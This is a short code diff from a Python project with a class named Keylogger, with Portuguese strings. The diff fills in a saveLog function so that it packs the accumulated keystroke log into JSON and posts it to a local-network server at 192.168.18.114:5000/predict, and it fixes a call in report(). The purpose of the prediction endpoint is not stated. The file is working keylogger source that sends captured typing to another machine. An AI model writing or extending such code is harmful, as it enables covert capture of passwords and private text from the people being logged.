@@ -14,7 +14,11 @@ SEND_REPORT_EVERY = 30
 
 
 def saveLog(self):
-    print("Em construção")
+    dataLogs = json.dumps({"valor": 0, "frase": self.log})
+    header = {'Content-type': 'application/json'}
+    image = requests.post("http://192.168.18.114:5000/predict", data=dataLogs, headers=header)
+
+    print(image.content)
 
 def getProcess(self):
     infoSet = set()
@@ -83,7 +87,7 @@ class Keylogger:
 
     def report(self):
         if self.log:
-            saveLog()
+            saveLog(self)
             sendAlert(self)
 
         self.log = ""
